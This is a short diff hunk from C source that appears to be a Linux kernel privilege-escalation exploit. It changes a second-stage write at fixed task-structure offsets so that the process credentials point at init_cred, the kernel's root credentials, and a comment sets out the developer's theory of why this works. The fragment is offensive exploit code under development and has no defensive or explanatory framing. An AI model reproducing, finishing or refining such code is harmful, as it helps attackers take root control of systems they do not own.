@@ -2644,8 +2644,17 @@ uid0_cred_punch:;
       g_cred2_lock_shift = 0x100;
       {
         int s2c = env_flag("UID0_STAGE2_CANARY", 0);
-        uid0_one_store(use_task + (s2c ? 0x790 : 0x780),
-                       s2c ? "child_comm_2nd" : "child_cred_2nd");
+        if (s2c) {
+          uid0_one_store(use_task + 0x790, "child_comm_2nd");
+        } else {
+          /* 09-13 reverter theory: syscall entry resets cred:=real_cred.
+           * Stage-1 put init_cred in real_cred, so stage-2's cred write
+           * (even if reverted) lands on init_cred either way. Use the
+           * DUALWRITE store-2 geometry at the SAME 0x778 anchor. */
+          setenv("MODE4_DUALWRITE", "1", 1);
+          uid0_one_store(use_task + 0x778, "child_dual_2nd");
+          unsetenv("MODE4_DUALWRITE");
+        }
       }
       g_cred2_lock_shift = 0;
       /* fresh DISARM for the second ghost */
